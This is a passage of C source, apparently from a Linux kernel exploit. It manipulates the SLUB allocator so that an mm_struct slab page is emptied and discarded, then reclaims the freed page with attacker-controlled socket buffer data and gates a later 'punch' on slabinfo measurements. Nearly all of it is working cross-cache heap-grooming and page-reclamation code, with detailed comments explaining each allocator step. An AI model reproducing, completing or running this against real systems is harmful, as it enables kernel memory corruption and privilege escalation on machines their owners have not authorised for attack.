         * reset.  If the list is already at or past cpu_partial when the
         * fillers' first free freezes base's page, that very push drains and
         * base's page is unfrozen with 31 free objects before any page has
         * been added to the node list; the fillers' remaining frees then
         * register individually (measured: active_objs fell by exactly the
         * number of frees, so no freeze survived).  Kills here push pages
         * until a drain is observed: a drop of one page's worth of free
         * objects proves unfreeze_partials() ran. */
        {
          long b0 = -1;
          long b1 = -1;
          long biggest = 0;
          size_t pre_pushes = 0;
          for (; fz_i < KS_FREEZER_DRAIN && pre_pushes < 64; fz_i++) {
            if (fz_drain[fz_i] <= 0) {
              continue;
            }
            mm_slab_counts(&b0, NULL);
            kill_child(fz_drain[fz_i]);
            fz_drain[fz_i] = -1;
            mm_slab_counts(&b1, NULL);
            pre_pushes++;
            if (b0 >= 0 && b1 >= 0 && b0 - b1 > biggest) {
              biggest = b0 - b1;
            }
            if (b0 >= 0 && b1 >= 0 &&
                (b0 - b1) >= (long)(mm_objs_per_slab - 1)) {
              break;
            }
          }
          pr_info("KS_PREDRAIN pushes=%zu drop=%ld cpu=%d\n", pre_pushes,
                  biggest, sched_getcpu());
        }
        /* base's page: pushed first, so it is the OLDEST entry on c->partial
         * and the drain below walks it last - after every page ahead of it has
         * raised n->nr_partial. */
        {
          long fa0 = -1, fn0 = -1, fs0 = -1;
          long fa1 = -1, fn1 = -1, fs1 = -1;
          double id_t0 = ks_now_ms();
          double id_sample_ms = 0.0;
          if (post_f != NULL) {
            rewind(post_f);
            (void)mm_slab_scan(post_f, &fa0, &fn0, &fs0);
          }
          /* One sample per object, not two: each row's "after" is the next
           * row's "before".  KS_ID_COST reports both halves of what this
           * loop costs: the samples (a /proc/slabinfo read regenerates the
           * whole cache list) and the kills, which the bulk loop this
           * replaces also paid. */
          {
            long sa0 = -1, sn0 = -1, ss0 = -1;
            double st0 = ks_now_ms();
            if (post_f != NULL) {
              rewind(post_f);
              (void)mm_slab_scan(post_f, &sa0, &sn0, &ss0);
            }
            id_sample_ms += ks_now_ms() - st0;
            for (size_t i = 0; i < freeze_kill; i++) {
              const char *alive;
              long sa1 = -1, sn1 = -1, ss1 = -1;
              int sampled;
              int st = task_state_char(pre_ctx.childs[i]);
              alive = st == 0 ? "gone"
                              : (st == 'Z' || st == 'X') ? "zombie"
                                                         : "yes";
              /* kill_child() reaps the task, and exit_mm() -> mmput() ->
               * __mmput() -> kmem_cache_free() runs inside that exit
               * (kernel/exit.c; kernel/fork.c:1069-1100), so the sample
               * below is taken after this object's free, not before it. */
              kill_child(pre_ctx.childs[i]);
              pre_ctx.childs[i] = -1;
              st0 = ks_now_ms();
              if (post_f != NULL) {
                rewind(post_f);
                (void)mm_slab_scan(post_f, &sa1, &sn1, &ss1);
              }
              id_sample_ms += ks_now_ms() - st0;
              sampled = (sa0 >= 0 && sn0 >= 0 && ss0 >= 0 && sa1 >= 0 &&
                         sn1 >= 0 && ss1 >= 0);
              kp_identity_slot(i, alive, sampled,
                               sampled ? sa1 - sa0 : 0,
                               sampled ? sn1 - sn0 : 0,
                               sampled ? ss1 - ss0 : 0, &kp_anchor);
              sa0 = sa1;
              sn0 = sn1;
              ss0 = ss1;
            }
          }
          pr_info("KS_ID_COST slots=%zu loop_us=%.0f sample_us=%.0f\n",
                  freeze_kill, (ks_now_ms() - id_t0) * 1000.0,
                  id_sample_ms * 1000.0);
          /* Sampled before the control's fillers are freed: this window
           * contains the anchor's 31 frees and nothing else. */
          if (post_f != NULL) {
            rewind(post_f);
            (void)mm_slab_scan(post_f, &fa1, &fn1, &fs1);
            pr_info("KS_FILL_DELTA fillers=%zu active=%ld->%ld d_active=%ld "
                    "d_num=%ld d_slabs=%ld page_was_full=%d\n",
                    freeze_kill, fa0, fa1, fa1 - fa0, fn1 - fn0, fs1 - fs0,
                    (fa1 == fa0 && fn1 == fn0 && fs1 == fs0) ? 1 : 0);
          }
        }
        pr_info("KS_FREEZE fillers=%zu target_pid=%d cpu=%d empty_cpu=%d\n",
                freeze_kill, (int)target, sched_getcpu(), burst_empty_cpu);
        /* The control page is built exactly like base's page (32 of our
         * children in one verified fresh slab) and is frozen here so the same
         * drain unfreezes it.  Its identity is known by construction, which
         * is what makes it a control for the target's page. */
        if (control_cnt > 1) {
          for (size_t i = 0; i + 1 < control_cnt; i++) {
            if (control_childs[i] > 0) {
              kill_child(control_childs[i]);
              control_childs[i] = -1;
            }
          }
          pr_info("KS_CTL_FREEZE fillers=%zu kept_pid=%d cpu=%d\n",
                  control_cnt - 1, (int)control_last, sched_getcpu());
        }
        /* The filler frees above are synchronous with the children's exits
         * and reaped (kill_child -> waitpid), so base's page already has
         * inuse 1 here.  A put_cpu_partial() from a later free can still
         * re-freeze the page after unfreeze_partials() walked the list, and
         * the target's free then takes FREE_FROZEN: inuse and active_objs do
         * not move and the gate refuses (measured d_empty=0).  The settling
         * window below is kept from the cycles that measured that; whether
         * it is still needed with synchronous frees is not established. */
        usleep(2000);
        pr_info("KS_FREEZE_WAIT ms=2 cpu=%d\n", sched_getcpu());
        if (post_f != NULL) {
          rewind(post_f);
          (void)mm_slab_scan(post_f, &freeze_active, &freeze_num,
                             &freeze_slabs);
          pr_info("KS_FREEZE_SAMPLE active=%ld num=%ld slabs=%ld "
                  "pre_active=%ld\n", freeze_active, freeze_num,
                  freeze_slabs, post_isolate_active);
        }
      }
      if (trigger_drain && trigger_fds != NULL) {
        size_t drain_slabs = trigger_drain_slabs;
        (void)drain_slabs;
        size_t limit = mm_cpu_partial_limit();
        size_t fed = 0;
        size_t pobjects = 1;   /* base's page: 32 - 31 free = 1 */
        int crossed = 0;
        int before_cpu = -1, after_cpu = -1;
        int drain_pid = -1;

        /* The baseline for the emptying free is the isolation sample.
         * base's page is frozen on CORE's c->partial here and a frozen page
         * is on no list at all, so no allocation can take it. */
        cross_active = post_isolate_active;
        cross_num = post_isolate_num;
        cross_slabs = post_isolate_slabs;

        /* [1] base's page is frozen with the target as its last live object.
         * That is not assumed here: the 31 filler frees immediately above
         * must leave active_objs unchanged (a frozen page is off every node
         * list, and get_slabinfo() counts free objects only on n->partial),
         * and KS_FREEZE_SAMPLE prints exactly that. */
        pin_to_core(EMPTYING_CPU);
        empty_cpu_before = sched_getcpu();
        pr_info("KS_EMPTY_PLAN cpu=%d expect=%d\n", empty_cpu_before,
                (int)EMPTYING_CPU);

        /* [2] Unfreeze to the node partial list, with the vendor's discard
         * precondition measured instead of assumed.
         *
         * unfreeze_partials() walks c->partial head -> tail and, for each
         * page, either discards it (`!new.inuse && n->nr_partial >=
         * s->min_partial`) or add_partial()s it, raising n->nr_partial.  A
         * frozen page is invisible to get_slabinfo(), so every page the drain
         * releases becomes visible as a ~(objects - 1)-object drop in
         * active_objs.  Therefore one kill whose active_objs drop is at least
         * min_partial * (objects - 1) proves the drain ran and that at least
         * min_partial pages were added to the node list - i.e. that
         * n->nr_partial >= s->min_partial from that instant on.  base's page
         * was pushed first, so it is the oldest entry and is released by that
         * same drain, leaving 31 free objects and the live target on
         * n->partial. */
        pin_to_core(CORE);
        {
          long need = mm_min_partial_limit();
          size_t pushes = 0;

          if (need <= 0) {
            need = 5;
          }
          /* Walk every freezer child, not one per page: a kill whose page is
           * already frozen returns FREE_FROZEN and pushes nothing, so the
           * number of pushes cannot be predicted from the index, and only a
           * measured drop proves the drain ran. */
          /* 128 kills is four per freezer page: enough to cross cpu_partial
           * many times, and few enough that every page the crossing adds still
           * holds ~28 live objects, so a later crossing cannot discard it and
           * undo the count the anchor's free needs. */
          for (; fz_i < KS_FREEZER_DRAIN && pushes < 128; fz_i++) {
            if (fz_drain[fz_i] <= 0) {
              continue;
            }
            kill_child(fz_drain[fz_i]);
            fz_drain[fz_i] = -1;
            pushes++;
          }
          /* No page-count estimate: the accumulated value was a quotient of
           * the active_objs drop by 31 and was never the number of pages the
           * unfreeze added.  The crossing reports only its push count and the
           * sample deltas that follow it. */
          crossed = pushes > 0;
          crossed_at = (int)pushes;
          fed = pushes;
          pobjects = pushes;
          drain_pid = -1;
          pr_info("KS_DRAIN pushes=%zu need=%ld cpu=%d\n", pushes, need,
                  sched_getcpu());
          (void)kp_run_advance(&run, KP_STAGE_BASELINE);
          /* Claimer first, then the baseline: fork() copies the parent's mm,
           * so this process's own mm_struct is one mm-cache allocation and it
           * has to be inside the banked baseline.  Started after it, the +1
           * would cancel the target's -1 and the gate would refuse. */
          /* Baseline immediately after the proven unfreeze and before the
           * emptying free: the only allocation of ours between this sample
           * and the discard is the target's own free. */
          if (crossed && post_f != NULL) {
            rewind(post_f);
            (void)mm_slab_scan(post_f, &cross_active, &cross_num,
                               &cross_slabs);
            pr_info("KS_DRAIN_BASE active=%ld num=%ld slabs=%ld\n", cross_active,
                    cross_num, cross_slabs);
          }
          /* The differential.  This page is the same object as base's page by
           * construction, was frozen the same way and is unfrozen by the same
           * drain; the only difference is that its identity needs no leak.
           * If this free discards, the machinery, the ordering and the
           * min_partial proof are all correct and base's page is the foreign
           * one.  If it does not, no page we built can discard and the defect
           * is the free never reaching __slab_free(). */
          /* The quiesced baseline is taken in [3a], after the target's
           * siblings are retired and immediately before its own exit.  Taken
           * here - before the retirement - every sibling's mm free landed
           * inside the measured window, which is what the measured
           * d_empty=-2 was: the anchor's discard (-1) plus one unrelated
           * object on a listed page (-1).  See docs/kernel-page/
           * instrumentation.md for the window and its arithmetic. */
        }

        /* [3a] The emptying free.  base's page is on n->partial with the
         * target as its only live object, and the drain above proved
         * n->nr_partial >= min_partial, so __slab_free() takes `slab_empty`:
         * remove_partial() + discard_slab().  The free runs on the escaped
         * CPU, whose c->page the seeder keeps on a slab of ours, so it cannot
         * take do_slab_free()'s fastpath.  Nothing sits between it and the
         * send below. */
        if (crossed && target > 0) {
          pin_to_core(EMPTYING_CPU);
          /* One task, one exit, one mm free.  With a sibling still holding
           * mm_users, this exit only drops a user, __mmput() never runs and
           * the slab free never happens (measured: the gate's d_empty=0 in
           * every refused cycle).  Retire the siblings first. */
          if (pre > 1) {
            int sib = kill_tgid_extras(target);
            int left = pre;
            for (int w = 0; w < 200; w++) {
              left = count_tgid_tasks(target);
              if (left <= 1) {
                break;
              }
              usleep(1000);
            }
            pr_info("KS_TARGET_TGID extras_killed=%d left=%d\n", sib, left);
            if (left > 1) {
              pin_bad++;
            }
            pin_to_core(EMPTYING_CPU);
          }
          /* The mm free runs inside the child's do_exit() on the CPU that
           * child is on, so that CPU is a fact to prove before the kill, not
           * after it.  A child on the wrong CPU parks the page on that CPU's
           * c->partial where no drain in this chain would see it. */
          {
            int tcpu = task_cpu_hint(target);
            pr_info("KS_FREE_CPU pid=%d cpu=%d expect=%d ok=%d\n", (int)target,
                    tcpu, (int)EMPTYING_CPU, tcpu == (int)EMPTYING_CPU);
            if (tcpu != (int)EMPTYING_CPU) {
              pin_bad++;
            }
          }
          /* Quiescent baseline: the window from here to the sample after the
           * sends contains exactly one mm free, the target's own.  The
           * siblings above are already retired (their mm frees are in the
           * past), the filler frees landed before the drain, and nothing else
           * in this process allocates from the mm cache.  Two agreeing reads
           * 2 ms apart are the evidence that nothing is still in flight. */
          if (crossed && post_f != NULL) {
            long qa = -1, qn = -1, qs = -1;
            int stable = 0;
            rewind(post_f);
            (void)mm_slab_scan(post_f, &cross_active, &cross_num,
                               &cross_slabs);
            for (int q = 0; q < 8; q++) {
              usleep(2000);
              rewind(post_f);
              (void)mm_slab_scan(post_f, &qa, &qn, &qs);
              if (qa == cross_active && qn == cross_num &&
                  qs == cross_slabs) {
                stable = 1;
                break;
              }
              cross_active = qa;
              cross_num = qn;
              cross_slabs = qs;
            }
            baseline_stable = stable;
            kp_run_sample(&run, cross_active, cross_num, cross_slabs);
            pr_info("KS_QUIESCE active=%ld num=%ld slabs=%ld stable=%d "
                    "window=gate\n",
                    cross_active, cross_num, cross_slabs, stable);
          }
          (void)kp_run_advance(&run, KP_STAGE_FREE);
          kill_child(target);
          free_done_t0 = ks_now_ms();
          child_leak = -1;
          /* waitpid() above rescheduled, so this sample is the CPU the close
           * and the sends below actually run on; it is what the gate uses. */
          empty_cpu_after = sched_getcpu();
          if (empty_cpu_after != (int)EMPTYING_CPU) {
            pin_bad++;
          }
          /* Warm this CPU's kmalloc-4k freelist with exactly the number of
           * skb heads the send below needs, after the child is reaped so its
           * do_exit() cannot consume the warmed objects.  alloc_skb(3712)
           * grows the kmalloc-4k cache when it has no free object, and a
           * kmalloc-4k slab is order 3: that growth would take the freed page
           * before the frag allocation does.  A 3712-byte send has data_len 0,
           * so the warm itself never allocates a frag page. */
          {
            char drainbuf[4096];
            /* The shaping stream still holds the 36480-byte pcp send queued
             * before the freeze, and unix_stream_recvmsg() consumes the
             * oldest skb first: a 3712-byte recv would drain that message
             * instead of the warm skb and leave the warm kmalloc-4k objects
             * allocated.  Empty the stream first so every recv below frees
             * exactly the head the warm just allocated. */
            while (recv(pcp_shaping_sv[1], drainbuf, sizeof(drainbuf),
                        MSG_DONTWAIT) > 0) {
            }
            head_warm = 0;
            for (int w = 0; w < IMAGE_SENDS; ++w) {
              struct iovec wiov;
              struct msghdr wmsg;
              char warmbuf[SKB_FRAG_BIAS];
              wiov.iov_base = page_image.buf;
              wiov.iov_len = (size_t)SKB_FRAG_BIAS;
              memset(&wmsg, 0, sizeof(wmsg));
              wmsg.msg_iov = &wiov;
              wmsg.msg_iovlen = 1;
              errno = 0;
              if (sendmsg(pcp_shaping_sv[0], &wmsg, 0) !=
                  (ssize_t)SKB_FRAG_BIAS) {
                break;
              }
              errno = 0;
              if (recv(pcp_shaping_sv[1], warmbuf, sizeof(warmbuf),
                       MSG_DONTWAIT) == (ssize_t)SKB_FRAG_BIAS) {
                head_warm++;
              }
            }
          }
          free_t0 = ks_now_ms();
          send_cpu = empty_cpu_after;
          /* kill_child() above reaped the target, and waitpid() cannot return
           * before the child's exit_mm() has run, so the emptying free
           * (__mmput -> mmdrop -> free_mm -> kmem_cache_free -> slab_empty ->
           * discard_slab -> __free_pages(order 3)) has already executed on
           * the proven CPU.  The only thing between it and the sendmsg()
           * below is the warm above, which touches kmalloc-4k, not this
           * cache, and the block sits on that CPU's order-3 pcp list. */
        }

        /* [3] First order-3 allocations after the discard: the image frags.
         * No /proc read, no log, no sched_setaffinity between the close that
         * emptied the page and this sendmsg(). */
        if (crossed) {
          {
            image_want = IMAGE_SENDS;
            image_done = 0;
            for (int s = 0; s < image_want; ++s) {
              errno = 0;
              image_ret = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
              if (image_ret != (ssize_t)SKB_SEND_SIZE) {
                image_errno = errno;
                break;
              }
              image_done++;
            }
            free_to_send_ms = ks_now_ms() - free_t0;
          }
          target_freed_at_cross = 1;
          /* Sample the CORE drain before the second one so each step's
           * effect is separated in the log. */
          if (post_f != NULL) {
            rewind(post_f);
            (void)mm_slab_scan(post_f, &core_active, &core_num,
                               &core_slabs);
            pr_info("KS_POSTDRAIN_SAMPLE active=%ld num=%ld slabs=%ld\n",
                    core_active, core_num, core_slabs);
          }
          pr_info("KS_DRAIN d=%zu pid=%d cpu=%d->%d pobjects=%zu limit=%zu "
                  "cross=1 empty=1 stage=after_unfreeze\n", (size_t)crossed_at,
                  drain_pid, before_cpu, after_cpu, pobjects, limit);
          pr_info("KS_EMPTYING kind=target-exit draining_cpu=%d cpu=%d->%d "
                  "page=n_partial expect=discard\n",
                  (int)EMPTYING_CPU, empty_cpu_before, empty_cpu_after);
          /* Sample after the image is queued: the skb allocations move no
           * mm-cache object, so nothing here can divert the block. */
          if (post_f != NULL) {
            rewind(post_f);
            (void)mm_slab_scan(post_f, &empty_active, &empty_num,
                               &empty_slabs);
          }
          (void)kp_run_advance(&run, KP_STAGE_GATE);
          kp_run_sample(&run, empty_active, empty_num, empty_slabs);
          pr_info("KS_SAMPLE1 tag=crossing active=%ld num=%ld slabs=%ld\n",
                  cross_active, cross_num, cross_slabs);
          pr_info("KS_SAMPLE2 tag=empty active=%ld num=%ld slabs=%ld\n",
                  empty_active, empty_num, empty_slabs);
          /* Tight differential.  The control page was built exactly like the
           * anchor's and is still listed with one live object, so its free is
           * the same slab_empty decision the anchor's free just made.  It is
           * killed here, microseconds after the anchor's free and with no
           * sleep in between: a discard now proves n->nr_partial >= min_partial
           * at the anchor's free, because one page cannot join the node list
           * and another leave it inside that gap.  Measurement only; the
           * anchor's free and the image send have already run. */
          if (control_last > 0) {
            long ca = -1, cn = -1, cs = -1;
            kill_child(control_last);
            control_last = -1;
            if (post_f != NULL) {
              /* Gap from the anchor's reaped free to this sample, not the
               * control's own exit time: that is the interval over which the
               * node partial count must not have moved. */
              long us = (long)((ks_now_ms() - (free_done_t0 >= 0
                                                   ? free_done_t0
                                                   : ks_now_ms())) *
                               1000.0);
              long da, dn, ds;
              const char *state;
              rewind(post_f);
              (void)mm_slab_scan(post_f, &ca, &cn, &cs);
              da = ca - empty_active;
              dn = cn - empty_num;
              ds = cs - empty_slabs;
              ctl_active = ca;
              ctl_num = cn;
              ctl_slabs = cs;
              /* Only two of these four states answer the min_partial question;
               * the frozen state means the control's free never reached the
               * list and must not be read as a refusal. */
              if (dn == -(long)mm_objs_per_slab && ds == -1 && da < 0) {
                state = "listed-discarded";      /* count was >= min */
              } else if (da < 0 && ds == 0) {
                state = "listed-refused";        /* count was < min */
              } else if (da == 0 && dn == 0 && ds == 0) {
                state = "frozen";                /* says nothing about count */
              } else {
                state = "other";
              }
              pr_info("KS_CTL_TIGHT us=%ld active=%ld num=%ld slabs=%ld "
                      "d_active=%ld d_num=%ld d_slabs=%ld discarded=%d "
                      "state=%s\n",
                      us, ca, cn, cs, da, dn, ds, ds == -1 ? 1 : 0, state);
            }
          }
          /* Quiet window after BOTH frees.  d_from_empty includes the control's
           * own discard and is printed for continuity; d_from_ctl is the check
           * that nothing moved after the last free, so a late discard of the
           * anchor page still shows up here. */
          if (post_f != NULL) {
            long settle_a = -1, settle_n = -1, settle_s = -1;
            usleep(50000);
            rewind(post_f);
            (void)mm_slab_scan(post_f, &settle_a, &settle_n, &settle_s);
            pr_info("KS_SETTLE ms=50 active=%ld num=%ld slabs=%ld "
                    "d_from_empty=%ld/%ld/%ld d_from_ctl=%ld/%ld/%ld\n",
                    settle_a, settle_n, settle_s, settle_a - empty_active,
                    settle_n - empty_num, settle_s - empty_slabs,
                    settle_a - ctl_active, settle_n - ctl_num,
                    settle_s - ctl_slabs);
          }
        }
        pr_info("KS_DRAIN_RESULT fed=%zu crossed=%d crossed_at=%d target=%d "
                "pobjects=%zu limit=%zu min_partial=%d\n", fed, crossed,
                crossed_at, target_freed_at_cross, pobjects, limit,
                mm_min_partial_limit());
      }
      if (!target_freed_at_cross) {
        (void)kp_run_refuse(&run, "no-crossing");
        ks_state_log(&run, "skipped", (unsigned long long)base);
        pr_error("KS_DELIVERY skipped=1 reason=no-crossing base=%016zx\n",
                 (size_t)base);
        if (post_f != NULL) {
          fclose(post_f);
          post_f = NULL;
        }
        release_ctx_children(&lead_ctx);
        release_ctx_children(&post_ctx);
        if (trigger_fds != NULL) {
          ks_trigger_release(trigger_fds, trigger_count);
          trigger_fds = NULL;
          trigger_count = 0;
        }
        ks_buddy_release(buddy_fds, buddy_n);
        buddy_fds = NULL;
        buddy_n = 0;
        if (ks) {
          kernelsnitch_cleanup(ks);
          ks = NULL;
        }
        ks_discard_failed = 1;
        return 0;
      }

      /* Proven-precondition gate.  A discarded slab and a replacement mm slab
       * inside one sample window leave slabinfo numerically identical, so a
       * global read can never prove the discard.  Fire on the conditions the
       * payload can prove: the verified whole-slab burst, the crossing that
       * put the page on the node partial above min_partial, and the emptying
       * free executed on a CPU whose c->page is not that page.  The send then
       * follows with no /proc read or allocation in between. */
      /* The emptying free must both register in page->inuse (the
       * do_slab_free fastpath touches c->freelist only) and remove the slab
       * from the cache (num_objs -32, slabdata -1).  Only that pair proves
       * the page the burst built is the page this free emptied. */
      /* The emptying free is made deliberately invisible (the page is frozen
       * when it runs, so __slab_free() leaves the accounting to the later
       * unfreeze), so `active_objs` cannot show it.  The observable that
       * cannot be faked by a frozen page is the whole-slab removal itself:
       * one page's worth of objects gone from the cache in the same window as
       * the drain that unfroze it.  registered is reported for continuity; it
       * is the drain's own delta and is not a precondition. */
      /* Exactly the emptying object and the page it emptied: one object
       * leaves active_objs, one slab leaves num_objs and slabdata. */
      {
        kp_gate_facts gate_facts;
        kp_sample gate_before;
        kp_sample gate_after;

        gate_before.active = cross_active;
        gate_before.num = cross_num;
        gate_before.slabs = cross_slabs;
        gate_after.active = empty_active;
        gate_after.num = empty_num;
        gate_after.slabs = empty_slabs;
        gate_facts.span_ok = burst_span_ok;
        gate_facts.target_freed = target_freed_at_cross;
        gate_facts.empty_cpu = burst_empty_cpu;
        gate_facts.want_cpu = (int)EMPTYING_CPU;
        gate_facts.pin_bad = pin_bad;
        gate_facts.slot_partial = slot_partial;
        gate_facts.baseline_ok = baseline_stable;
        gate_facts.objects_per_slab = (long)mm_objs_per_slab;
        kp_gate_evaluate(&gate_facts, &gate_before, &gate_after, &gate_verdict);
        empty_registered = gate_verdict.registered;
        whole_slab_discard = gate_verdict.discarded;
        targeted = gate_verdict.targeted;
      }
      pr_info("KS_GATE span_ok=%d crossed_at=%d min_partial=%d empty_cpu=%d "
              "registered=%d discarded=%d image=%d gap_ms=%.3f d_empty=%ld "
              "d_num=%ld d_slabs=%ld pin_bad=%d slot_partial=%d "
              "preconditions=%d\n", burst_span_ok, crossed_at,
              mm_min_partial_limit(), burst_empty_cpu, empty_registered,
              whole_slab_discard, image_done, free_to_send_ms,
              empty_active - cross_active, empty_num - cross_num,
              empty_slabs - cross_slabs, pin_bad, slot_partial, targeted);
      /* The emptying free's row, from the samples the gate already took:
       * no /proc read is added between that free and the sends. */
      kp_identity_slot(pre_ctx.mm_cnt - 1,
                       target_state_at_freeze == 0
                           ? "gone"
                           : (target_state_at_freeze == 'Z' ||
                              target_state_at_freeze == 'X')
                                 ? "zombie"
                                 : "yes",
                       (empty_active >= 0 && cross_active >= 0 &&
                        empty_num >= 0 && cross_num >= 0 &&
                        empty_slabs >= 0 && cross_slabs >= 0),
                       empty_active - cross_active, empty_num - cross_num,
                       empty_slabs - cross_slabs, &kp_anchor);
      kp_identity_summary(pre_ctx.mm_cnt, kp_anchor.page ? 1 : 0);
      if (empty_registered) {
        kp_result_mark(KP_ALLOCATOR_TRANSITION_VERIFIED);
      }
      /* Reclamation is the claim "the slab this burst built left the cache".
       * A -32/-1 window alone does not support it: it can be a page we did not
       * build, or a discard with an unrelated free on top.  Only the gate that
       * sees one object and one page together marks it. */
      if (targeted) {
        kp_result_mark(KP_RECLAMATION_VERIFIED);
      }
      /* Identity and consumption cannot be established from here: the run
       * only sees the allocator's accounting, never the page's contents. */
      kp_result_report((uintptr_t)base);
      if (targeted) {
        (void)kp_run_deliver(&run);
        ks_state_log(&run, "pending", (unsigned long long)base);
      }
      if (!targeted) {
        /* The precondition visibly failed: the page at base is still part of
         * the mm cache, so the image send would land elsewhere and the punch
         * would fault on a foreign page.  Refuse to send and refuse to punch;
         * the caller reports a failed preparation rather than a delivery
         * test.  State the vendor path and what the cache shows, so the next
         * pass starts from a measured holder instead of a blind retry. */
        post_active = -1;
        post_num = -1;
        post_slabs = -1;
        if (post_f != NULL) {
          rewind(post_f);
          (void)mm_slab_scan(post_f, &post_active, &post_num, &post_slabs);
          fclose(post_f);
          post_f = NULL;
        }
        /* Three different windows, printed as three: the isolation sample,
         * the gate baseline and the post-cleanup sample.  The old arrow
         * compared the isolation value with the post-cleanup one and read as
         * a single transition that never happened. */
        pr_info("KS_TARGET_FREE waited_ms=%ld iso=%ld/%ld/%ld "
                "gate=%ld/%ld/%ld post=%ld/%ld/%ld crossed_at=%d\n",
                free_wait_ms, post_isolate_active, post_isolate_num,
                post_isolate_slabs, cross_active, cross_num, cross_slabs,
                post_active, post_num, post_slabs, crossed_at);
        pr_info("KS_TARGET_REASON base_page=gate-failed cpu=%d "
                "crossed_at=%d\n", sched_getcpu(), crossed_at);
        pr_info("KS_EMPTY_FREE kind=target-exit cpu=%d->%d draining=%d "
                "ok=%d\n", empty_cpu_before, empty_cpu_after,
                (int)EMPTYING_CPU,
                empty_cpu_after == (int)EMPTYING_CPU);
        mm_slab_print("post-drain", post_active, post_num, post_slabs);
        pr_info("KS_DISCARD post active_objs=%ld num_objs=%ld slabdata=%ld\n",
                post_active, post_num, post_slabs);
        (void)kp_run_refuse(&run, "gate-preconditions");
        ks_state_log(&run, "skipped", (unsigned long long)base);
        pr_error("KS_DELIVERY skipped=1 reason=gate-preconditions "
                 "base=%016zx\n", (size_t)base);
        release_ctx_children(&lead_ctx);
        release_ctx_children(&post_ctx);
        if (trigger_fds != NULL) {
          ks_trigger_release(trigger_fds, trigger_count);
          trigger_fds = NULL;
          trigger_count = 0;
        }
        ks_buddy_release(buddy_fds, buddy_n);
        buddy_fds = NULL;
        buddy_n = 0;
        if (ks) {
          kernelsnitch_cleanup(ks);
          ks = NULL;
        }
        ks_discard_failed = 1;
        return 0;
      }

      /* The image frag was already queued inside the drain, as the first
       * order-3 allocation after the emptying free.  Vendor free_unref_page()
       * is order-0 only, so a discarded slab goes to the zone buddy list and
       * any CPU pops it; the send ran on the freeing CPU so "same CPU" is a
       * measured fact rather than a claim.  gap_ms is the whole window
       * between the emptying free and the first allocation. */
      {
        if (image_errno != 0) {
          pr_warning("KS_IMAGE_PIN send=%d ret=%zd errno=%d\n", image_done,
                     image_ret, image_errno);
        }
        pr_info("KS_IMAGE_PIN mode=immediate sends=%d of=%d base=%016zx "
                "warm=%zd cpu=%d freeing_cpu=%d same=%d gap_ms=%.3f\n",
                image_done, image_want, (size_t)base, head_warm, send_cpu,
                (int)EMPTYING_CPU, send_cpu == (int)EMPTYING_CPU,
                free_to_send_ms);
        pin_to_core(CORE);
      }
      /* Held until after the frag was allocated, so no write could split the
       * block between the target's free and the send. */
      pr_info("KS_EMPTY_FREE kind=target-exit cpu=%d->%d draining=%d ok=%d\n",
              empty_cpu_before, empty_cpu_after, (int)EMPTYING_CPU,
              empty_cpu_after == (int)EMPTYING_CPU);
      /* Sample only now: the image is already the first order-3 allocation of
       * the window, so nothing here can divert the block.  A flat cache here
       * means the discard was masked by a replacement slab, not that it did
       * not happen; the punch is the signal that decides. */
      free_wait_ms = 0;
      if (post_f != NULL) {
        rewind(post_f);
        (void)mm_slab_scan(post_f, &post_active, &post_num, &post_slabs);
        fclose(post_f);
        post_f = NULL;
      }
      pr_info("KS_TARGET_FREE waited_ms=%ld active=%ld->%ld num=%ld->%ld "
              "slabs=%ld->%ld crossed_at=%d\n", free_wait_ms,
              cross_active, post_active, cross_num, post_num,
              cross_slabs, post_slabs, crossed_at);
      /* One verdict, one window.  This line used to carry its own predicate
       * over the post-cleanup sample, which is a different interval from the
       * gate's and could disagree with KS_GATE in the same log.  It now
       * restates the gate's verdict and prints the later sample separately. */
      pr_info("KS_DISCARD verdict=%s window=gate deltas=%ld/%ld/%ld "
              "expect=-1/-%zu/-1 post=%ld/%ld/%ld base=%016zx\n",
              gate_verdict.targeted ? "match" : "refused",
              gate_verdict.d_active, gate_verdict.d_num, gate_verdict.d_slabs,
              (size_t)mm_objs_per_slab, post_active - cross_active,
              post_num - cross_num, post_slabs - cross_slabs, (size_t)base);
      pr_info("KS_SAMPLE3 tag=post-send active=%ld num=%ld slabs=%ld\n",
              post_active, post_num, post_slabs);
      /* d_cross spans the drain, d_empty is the gate window, d_after spans
       * the post-send cleanup.  gate= is the same verdict KS_GATE printed; the
       * old discarded= field called flat counters a discard, which is the
       * opposite of what the counters mean. */
      pr_info("KS_ARITH cross=%ld empty=%ld post=%ld d_cross=%ld d_empty=%ld "
              "d_after=%ld gate=%d\n", cross_active, empty_active,
              post_active, cross_active - post_isolate_active,
              empty_active - cross_active, post_active - empty_active,
              gate_verdict.targeted);
      pr_info("KS_TARGET_REASON object=freed slab=precondition cpu=%d\n",
              sched_getcpu());
      mm_slab_print("post-drain", post_active, post_num, post_slabs);
      pr_info("KS_DISCARD post active_objs=%ld num_objs=%ld slabdata=%ld\n",
              post_active, post_num, post_slabs);
      child_leak = -1;
      memfd_leak = -1;
    /* The image is queued now (KS_IMAGE_PIN above), before any other kernel
     * allocation in the gap; the reclaim sends below are extra coverage.
     * The neighbour slabs that kept base's order-3 buddy allocated are
     * still held here. */
    release_ctx_children(&lead_ctx);
    release_ctx_children(&post_ctx);
    slab32_log("post-pin");
      /* The image page is held now; the accounting reads can no longer
       * divert the target block. */
      extra = kill_tgid_tasks(target);
      left = count_tgid_tasks(target);
      pr_info("KS_TARGET_TASKS pre=%d extra_killed=%d left=%d "
              "memfds_closed=%d\n", pre, extra, left, memfds);
      {
        long target_active = -1;
        long target_slabs = -1;
        int waited = 0;
        mm_slab_counts(&target_active, &target_slabs);
        pr_info("KS_TARGET_RCU waited_ms=%d baseline=%ld post_isolate=%ld/%ld "
                "post_target=%ld/%ld\n", waited, baseline_slabs,
                post_isolate_active, post_isolate_slabs, target_active,
                target_slabs);
      }
      mm_slab_log("post-target-free");
      slab32_log("post-target-free");
    }
  }

  int multi_spray = 0;
  {
    const char *ms = getenv("KS_SPRAY_SOCKETS");
    long want = ms ? atol(ms) : 0;
    if (want > 0 && want <= 8192 && trigger_drain) {
      int *sfds = malloc((size_t)want * 2 * sizeof(*sfds));
      if (sfds != NULL) {
        size_t made = 0;
        for (long i = 0; i < want * 2; ++i) {
          sfds[i] = -1;
        }
        pin_to_core(CORE);
        for (long i = 0; i < want; ++i) {
          struct iovec iov;
          struct msghdr m;
          ssize_t sent;

          if (socketpair(AF_UNIX, SOCK_STREAM, 0, &sfds[i * 2]) != 0) {
            break;
          }
          memset(&iov, 0, sizeof(iov));
          iov.iov_base = page_image.buf;
